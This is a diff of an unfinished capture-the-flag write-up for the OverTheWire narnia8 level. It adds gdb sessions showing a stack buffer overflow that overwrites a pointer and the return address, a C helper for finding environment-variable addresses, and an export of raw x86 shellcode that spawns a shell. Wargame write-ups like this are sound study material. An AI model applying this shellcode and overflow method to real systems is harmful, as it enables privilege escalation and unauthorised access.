@@ -98,7 +98,7 @@ AAAAAAAAAAAAAAAAAAAAAG��
 [Inferior 1 (process 1970) exited normally]
 >```
 >
-> Hmmmm.  We didn't get a seg fault, but we got some weird characters added in with out ```A```.  Let's try a bit bigger.
+> Hmmmm.  We didn't get a seg fault, but we got some weird characters added in with our ```A```.  Let's try a bit bigger.
 >
 >```
 (gdb) run $(python -c 'print "A"*40')
@@ -202,4 +202,108 @@ Breakpoint 1, 0x080484a7 in func ()
 >
 > Ah, so that position looks like it holds the address of where our ```argv[1]``` is being stored.  So I guess when it overwrites that address it is no longer pointing at our input but to something else in memory.  Can we just make sure we overwrite that location with the intended address?
 >
-> TODO
+>```
+(gdb) run $(python -c 'print "A"*19')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*19')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/20x $esp
+0xffffd3b0:	0x08048580	0xffffd3c8	0x00000014	0xf7e3e1e3
+0xffffd3c0:	0x00000000	0x00ca0000	0x41414141	0x41414141
+0xffffd3d0:	0x41414141	0x41414141	0x00414141	0xffffd63c
+0xffffd3e0:	0x00000002	0xffffd4a4	0xffffd408	0x080484cd
+0xffffd3f0:	0xffffd63c	0xf7ffd000	0x080484fb	0xf7fb3000
+>
+(gdb) run $(python -c 'print "A"*20+"\x3c\xd6\xff\xff"')
+Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"\x3c\xd6\xff\xff"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/20x $esp
+0xffffd3b0:	0x08048580	0xffffd3c8	0x00000014	0xf7e3e1e3
+0xffffd3c0:	0x00000000	0x00ca0000	0x41414141	0x41414141
+0xffffd3d0:	0x41414141	0x41414141	0x41414141	0xffff443c
+0xffffd3e0:	0x00000002	0xffffd4a4	0xffffd408	0x080484cd
+0xffffd3f0:	0xffffd637	0xf7ffd000	0x080484fb	0xf7fb3000
+>```
+>
+> So it looks like the address didn't overwrite with the value we intended, but I bet it has to do with the length of the actual input itself. Let's mock up the complete payload to include overwriting the return address and see if we can get the updated address and successfully overwrite it.
+>
+>```
+(gdb) run $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"RRRR"+"A"*12+"RRRR"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) x/20x $esp
+0xffffd3a0:	0x08048580	0xffffd3b8	0x00000014	0xf7e3e1e3
+0xffffd3b0:	0x00000000	0x00ca0000	0x41414141	0x41414141
+0xffffd3c0:	0x41414141	0x41414141	0x41414141	0xffff4952
+0xffffd3d0:	0x00000002	0xffffd494	0xffffd3f8	0x080484cd
+0xffffd3e0:	0xffffd627	0xf7ffd000	0x080484fb	0xf7fb3000
+(gdb) x/20x 0xffff4952 
+0xffff4952:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffff4962:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffff4972:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffff4982:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffff4992:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/20x 0xffffd627 
+0xffffd627:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd637:	0x41414141	0x52525252	0x41414141	0x41414141
+0xffffd647:	0x41414141	0x52525252	0x47445800	0x4e54565f
+0xffffd657:	0x00373d52	0x5f474458	0x53534553	0x5f4e4f49
+0xffffd667:	0x313d4449	0x48535300	0x4547415f	0x505f544e
+>```
+>
+> Well, I was expecting the address ```0xffff4952``` to hold our data, but after some looking I was able to locate the ```A``` at ```0xffffd627```.  Let's go back and see if we can overwrite that address with the updated ```argv[1]``` address.
+>
+>```
+(gdb) run $(python -c 'print "A"*20+"\x27\xd6\xff\xff"+"A"*12+"RRRR"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+>
+Starting program: /root/OverTheWire/narnia/narnia8 $(python -c 'print "A"*20+"\x27\xd6\xff\xff"+"A"*12+"RRRR"')
+>
+Breakpoint 1, 0x080484a7 in func ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAA'���AAAAAAAAAAAARRRR'���
+>
+Program received signal SIGSEGV, Segmentation fault.
+0x52525252 in ?? ()
+>```
+>
+> Now we're getting somewhere.  We can finally see our full output. This means that overwriting that address successfully kept us pointing to the input and we ended up get our segmentation fault on the return address.  The only problem is that I don't think we have enough room to put our shellcode into the input.  We can turn back to narnia1 where we used an environment variable to store our shellcode, but we'll have to find the address for it somehow.  After some looking around I found a simple C program that will locate the address of environment variables by name.
+>
+>```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+>
+int main(int argc, char **argv) {
+    char *ptr;
+    ptr = getenv(argv[1]);
+    if( ptr == NULL )
+        printf("%s not found\n", argv[1]);
+    else printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
+    return 0;
+}
+>```
+>
+> Let's compile it, setup our shellcode, and see what it gives us.
+>
+>```
+root@kali:~# gcc -Wall -o getenvaddress getenvaddress.c 
+getenvaddress.c: In function ‘main’:
+getenvaddress.c:10:48: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+     else printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
+root@kali:~# export EGG=$(python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
+root@kali:~# ./getenvaddress EGG
+EGG found at ffffe74f
+>```
+
+TODO
